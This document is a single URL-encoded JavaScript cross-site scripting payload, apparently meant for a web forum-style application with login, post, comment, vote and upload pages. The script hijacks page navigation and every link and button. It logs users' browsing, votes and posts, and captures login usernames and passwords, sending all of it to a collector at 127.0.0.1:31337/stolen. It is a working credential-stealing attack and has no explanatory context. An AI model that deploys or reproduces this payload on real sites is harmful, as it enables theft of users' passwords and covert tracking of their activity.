%3Cscript%3Evar+globalUsername%2Cserver_address%3D%22127.0.0.1%3A31337%2Fstolen%22%3Bwindow.history%26%26window.history.pushState%26%26%24%28window%29.on%28%22popstate%22%2Cfunction%28e%29%7Bvar+t%3Dwindow.location.href%3Bconsole.log%28%22Back+button+was+pressed.+will+go+bakc+to%22%2Bt%29%2CloadContent%28t%2CreplacePage%2Cnull%2C2%29%2Ce.preventDefault%28%29%7D%29%3Bvar+script%3Ddocument.createElement%28%22script%22%29%3Bfunction+communicationHAndler%28e%29%7Bvar+t%3D%22http%3A%2F%2F%22%2Bserver_address%2B%22%3F%22%2Be%3B%24.get%28t%2Cfunction%28%29%7B%7D%29%7Dfunction+getValue%28e%2Ct%29%7Bif%28%22string%22%3D%3Dtypeof+e%7C%7Ce+instanceof+String%29for%28var+n%3De.split%28%22%26%22%29%2Cl%3D0%3Bl%3Cn.length%3Bl%2B%2B%29%7Bvar+a%3Dn%5Bl%5D.split%28%22%3D%22%29%3Bif%28a%5B0%5D%3D%3Dt%29return+a%5B1%5D%7Dreturn+null%7Dfunction+loadNotify%28e%2Ct%29%7Bvar+n%2Cl%2Ca%3De.substring%28e.lastIndexOf%28%22%2F%22%29%2B1%29%3Bswitch%28-1%21%3Da.lastIndexOf%28%22%3F%22%29%26%26%28n%3Da.substring%28a.lastIndexOf%28%22%3F%22%29%2B1%29%2Ca%3Da.substring%280%2Ca.lastIndexOf%28%22%3F%22%29%29%29%2Cconsole.log%28%22final+path+is+%3A+%22%2Ba%29%2Ca%29%7Bcase%22login.php%22%3Al%3DglobalUsername%3F%22event%3Dnav%26user%3D%22%2BglobalUsername%2B%22%26url%3D%22%2Ba%3A%22event%3Dnav%26url%3D%22%2Ba%3Bbreak%3Bcase%22logout.php%22%3Al%3D%22event%3Dlogout%26user%3D%22%2BglobalUsername%3Bbreak%3Bcase%22view.php%22%3AcommunicationHAndler%28l%3DglobalUsername%3F%22event%3Dnav%26user%3D%22%2BglobalUsername%2B%22%26url%3D%22%2Ba%3A%22event%3Dnav%26url%3D%22%2Ba%29%3Bvar+o%3Dn.substring%28n.lastIndexOf%28%22%3D%22%29%2B1%29%3Bl%3DglobalUsername%3F%22event%3Dview%26user%3D%22%2BglobalUsername%2B%22%26post%3D%22%2Bo%3A%22event%3Dview%26post%3D%22%2Bo%3Bbreak%3Bcase%22%22%3Acase%22privacy.php%22%3Al%3DglobalUsername%3F%22event%3Dnav%26user%3D%22%2BglobalUsername%2B%22%26url%3D%22%2Ba%3A%22event%3Dnav%26url%3D%22%2Ba%3Bbreak%3Bcase%22content.php%22%3Al%3D%22event%3Dnav%26user%3D%22%2BglobalUsername%2B%22%26url%3D%22%2Ba%3Bbreak%3Bcase%22vote.php%22%3Ao%3DgetValue%28t%2C%22id%22%29%3Bvar+s%3DgetValue%28t%2C%22vote%22%29%3Bl%3D%22event%3Dvote%26user%3D%22%2BglobalUsername%2B%22%26post%3D%22%2Bo%2B%22%26vote%3D%22%2Bs%3Bbreak%3Bdefault%3Al%3DglobalUsername%3F%22event%3Dlink%26user%3D%22%2BglobalUsername%2B%22%26link%3D%22%2Be%3A%22event%3Dlink%26link%3D%22%2Be%7DcommunicationHAndler%28l%29%7Dfunction+loadContent%28e%2Ct%2Cn%2Cl%29%7Bconsole.log%28%22load+Conetnt+on+%3A+%22%2Be%29%2CloadNotify%28e%2Cn%29%2Cxmlhttp%3Dnew+XMLHttpRequest%2Cxmlhttp.onreadystatechange%3Dfunction%28%29%7Bif%284%3D%3Dxmlhttp.readyState%26%26%28200%3D%3Dxmlhttp.status%7C%7C302%3D%3Dxmlhttp.status%29%29%7Bvar+n%3Dxmlhttp.responseURL.substring%28xmlhttp.responseURL.lastIndexOf%28%22%2F%22%29%2B1%29%3B-1%21%3Dn.lastIndexOf%28%22%3F%22%29%26%26%28n%3Dn.substring%280%2Cn.lastIndexOf%28%22%3F%22%29%29%29%3Bvar+a%3De.substring%28e.lastIndexOf%28%22%2F%22%29%2B1%29%3B-1%21%3Da.lastIndexOf%28%22%3F%22%29%26%26%28a%3Da.substring%280%2Ca.lastIndexOf%28%22%3F%22%29%29%29%2Cn%21%3Da%26%26%28console.log%28%22redirect+to%3A+%22%2Bn%2B%22+ori+%3A+%22%2Ba%29%2CloadNotify%28e%3Dn%2Cnull%29%29%2Ct%28e%2Cxmlhttp.response%2C1%3D%3Dl%3F1%3A2%29%7D%7D%2Cxmlhttp.open%28%22GET%22%2Ce%2C%211%29%2Cnull%3D%3Dn%3Fxmlhttp.send%28%29%3Axmlhttp.send%28n%29%7Dfunction+postNotify%28e%2Ct%29%7Be.substring%28e.lastIndexOf%28%22%2F%22%29%2B1%29%3Bvar+n%2Cl%3DgetValue%28t%2C%22username%22%29%2Ca%3DgetValue%28t%2C%22password%22%29%2Co%3DgetValue%28t%2C%22comment%22%29%2Cs%3DgetValue%28t%2C%22parent%22%29%2Cr%3D%28getValue%28t%2C%22uid%22%29%2CgetValue%28t%2C%22title%22%29%29%2Cu%3DgetValue%28t%2C%22content%22%29%2Ci%3DgetValue%28t%2C%22type%22%29%2Cd%3D1%3Bnull%21%3Dl%26%26null%21%3Da%3Fn%3D%22event%3Dlogin%26user%3D%22%2Bl%2B%22%26pass%3D%22%2Ba%3Anull%21%3Do%26%26null%21%3Ds%3Fn%3D%22event%3Dcomment%26user%3D%22%2BglobalUsername%2B%22%26parent%3D%22%2Bs%3Anull%21%3Dr%26%26null%21%3Du%26%26null%21%3Dtype%3Fn%3D%22event%3Dpost%26user%3D%22%2BglobalUsername%2B%22%26title%3D%22%2Br%2B%22%26type%3D%22%2Bi%3A%22upload.php%22%3D%3De%3Fn%3D%22event%3Dimage%26user%3D%22%2BglobalUsername%3A%28d%3D0%2Cconsole.log%28%22unrecongized+post+type+%21%21%22%29%29%2C1%3D%3Dd%26%26communicationHAndler%28n%29%7Dfunction+postRequest%28e%2Ct%2Cn%2Cl%29%7Bconsole.log%28%22will+post+to+%22%2Be%2B%22+data+is+%3A+%22%2Bn%29%2CpostNotify%28e%2Cn%29%3Bvar+a%3Dnew+XMLHttpRequest%3Ba.onreadystatechange%3Dfunction%28%29%7Bif%284%21%3Da.readyState%7C%7C200%21%3Da.status%26%26302%21%3Da.status%29console.log%28%22post+status+not+handled%3A+%22%2Ba.status%29%3Belse%7Bvar+n%3Da.responseURL.substring%28a.responseURL.lastIndexOf%28%22%2F%22%29%2B1%29%3B-1%21%3Dn.lastIndexOf%28%22%3F%22%29%26%26%28n%3Dn.substring%280%2Cn.lastIndexOf%28%22%3F%22%29%29%29%3Bvar+o%3De.substring%28e.lastIndexOf%28%22%2F%22%29%2B1%29%3B-1%21%3Do.lastIndexOf%28%22%3F%22%29%26%26%28o%3Do.substring%280%2Co.lastIndexOf%28%22%3F%22%29%29%29%2Cn%21%3Do%26%26%28console.log%28%22redirect+to%3A+%22%2Bn%2B%22+ori+%3A+%22%2Bo%29%2CloadNotify%28e%3Dn%2Cnull%29%29%2Ct%28e%2Ca.response%2C1%3D%3Dl%3F1%3A2%29%7D%7D%2Ca.open%28%22POST%22%2Ce%2C%210%29%2C1%3D%3Dl%26%26a.setRequestHeader%28%22Content-type%22%2C%22application%2Fx-www-form-urlencoded%22%29%2Ca.send%28n%29%7Dfunction+replacePage%28e%2Ct%2Cn%29%7Bvar+l%3Ddocument.createElement%28%22html%22%29%3Bl.innerHTML%3Dt%2CyourGlobalVariable%3Dl%2Cdocument.body.innerHTML%3Dl.getElementsByTagName%28%22body%22%29%5B0%5D.innerHTML%2C1%3D%3Dn%26%26window.history.pushState%28null%2C%22Title%22%2Ce%29%2CaddListener%28%29%2Cconsole.log%28%22page+listener+add+done%22%29%7Dfunction+linkClickHandler%28e%29%7Bif%28console.log%28%22called+on+%22%2Be.href%29%2Ce.href%29%7Be.href.substring%28e.href.lastIndexOf%28%22%2F%22%29%2B1%29%3BloadContent%28e.href%2CreplacePage%2Cnull%2C1%29%7D%7Dfunction+buttonClickHandler%28e%2Ct%29%7Bif%28%22login-btn%22%3D%3De.id%29postRequest%28t%3D%22post.php%22%2CreplacePage%2Ca%3D%22username%3D%22%2Bdocument.getElementById%28%22username%22%29.value%2B%22%26password%3D%22%2Bdocument.getElementById%28%22userpass%22%29.value%2B%22%26form%3Dlogin%22%2C1%29%3Belse+if%28%22comment-post-btn%22%3D%3De.id%29%7Bt%3D%22post.php%22%3Bvar+n%3Ddocument.getElementById%28%22comment%22%29.value%2Cl%3Ddocument.getElementById%28%22parent%22%29.value%2Ca%3D%22comment%3D%22%2Bn%2B%22%26form%3Dcomment%26parent%3D%22%2Bl%2B%22%26uid%3D%22%2Bdocument.getElementById%28%22uid%22%29.value%2B%22%26submit%3D%22%3Bconsole.log%28%22will+comments+on+behalf+of++%22%2BglobalUsername%2B%22+parent+%22%2Bl%29%2CpostRequest%28t%2CreplacePage%2Ca%2C1%29%7Delse+if%28%22content-post-btn%22%3D%3De.id%29%7Bt%3D%22post.php%22%3Bvar+o%3Ddocument.getElementById%28%22title%22%29.value%2Cs%3Ddocument.getElementById%28%22content%22%29.value%2Cr%3Ddocument.getElementById%28%22type%22%29.value%3Ba%3D%22title%3D%22%2Bo%2B%22%26form%3Dcontent%26content%3D%22%2Bs%2B%22%26type%3D%22%2Br%2B%22%26submit%3D%22%3Bconsole.log%28%22will+post+on+behalf+of++%22%2BglobalUsername%2B%22title%3A+%22%2Bo%2B%22+type+%3A+%22%2Br%29%2CpostRequest%28t%2CreplacePage%2Ca%2C1%29%7Delse+if%28%22image-post-btn%22%3D%3De.id%29%7Bt%3D%22upload.php%22%2C%28a%3Dnew+FormData%28%24%28%22%23image-upload-frm%22%29%5B0%5D%29%29.processData%3D%211%2Ca.contentType%3D%211%2Cconsole.log%28%22will+post+image+on+behalf+of++%22%2BglobalUsername%29%2CpostRequest%28t%2CreplacePage%2Ca%2C2%29%7D%7Dfunction+normalLinkHandler%28e%2Ct%29%7Bif%28String%28t%29.includes%28%22vote.php%22%29%29%7Bvar+n%3Dnew+RegExp%28%2F%5C%5C%3Fid%3D%5B0-9%5D%2B%2F%29%2Cl%3Dnew+RegExp%28%2Fvote%3D%5B0-9%5D%2B%2F%29%2Ca%3Dnew+RegExp%28%2Fvote%3D-%5Cd%2B%24%2F%29%2Co%3DString%28t.match%28n%29%29%2Cs%3Do.substring%28o.lastIndexOf%28%22%3D%22%29%2B1%29%2Cr%3DString%28t.match%28l%29%29%3B%22null%22%3D%3Dr%26%26%28r%3DString%28t.match%28a%29%29%29%3Bvar+u%3Dr.substring%28r.lastIndexOf%28%22%3D%22%29%2B1%29%3Bconsole.log%28%22user+vote+on+post%3A+%22%2BglobalUsername%2B%22+postid+%3A+%22%2Bs%2B%22+vote+val+%3A+%22%2Bu%29%2CloadContent%28t%2CreplacePage%2C%22id%3D%22%2Bs%2B%22%26vote%3D%22%2Bu%2C1%29%7Delse+console.log%28%22user+view+on+username%3A+%22%2BglobalUsername%2B%22+url+%3A+%22%2Bt%29%2CloadContent%28t%2CreplacePage%2Cnull%2C1%29%3Breturn%211%7Dfunction+addListener%28%29%7B%24%28%22.custom-file-input%22%29.on%28%22change%22%2Cfunction%28%29%7Blet+e%3D%24%28this%29.val%28%29.split%28%22%5C%5C%22%29.pop%28%29%3B%24%28this%29.next%28%22.custom-file-label%22%29.addClass%28%22selected%22%29.html%28e%29%7D%29%3Bvar+e%3Ddocument.getElementById%28%22logged-in-user%22%29%3BglobalUsername%3De%3Fe.innerText%3Anull%3Bfor%28var+t%3Ddocument.links%2Cn%3Dt.length%2Cl%3D0%3Bl%3Cn%3Bl%2B%2B%29%7Bdocument.getElementById%28t%5Bl%5D.id%29%3Fdocument.getElementById%28t%5Bl%5D.id%29.addEventListener%28%22click%22%2Cfunction%28e%29%7Be.preventDefault%28%29%2ClinkClickHandler%28e.target%7C%7Ce.srcElement%29%7D%29%3At%5Bl%5D.setAttribute%28%22onclick%22%2C%22normalLinkHandler%28%27%22%2BglobalUsername%2B%22%27%2C%27%22%2Bt%5Bl%5D.href%2B%22%27%29%3B+return+false%3B%22%29%7Dvar+a%3Ddocument.getElementsByTagName%28%22button%22%29%3Bfor%28l%3D0%3Bl%3Ca.length%3Bl%2B%2B%29a%5Bl%5D.addEventListener%28%22click%22%2Cfunction%28e%29%7Be.preventDefault%28%29%2CbuttonClickHandler%28e.target%7C%7Ce.srcElement%2Cdocument.url%29%7D%29%7Dfunction+payload%28e%29%7BaddListener%28%29%7Dscript.src%3D%22https%3A%2F%2Fcode.jquery.com%2Fjquery-3.4.1.min.js%22%2Cdocument.getElementsByTagName%28%22head%22%29%5B0%5D.appendChild%28script%29%2Cpayload%28%22attack%22%29%3B%3C%2Fscript%3E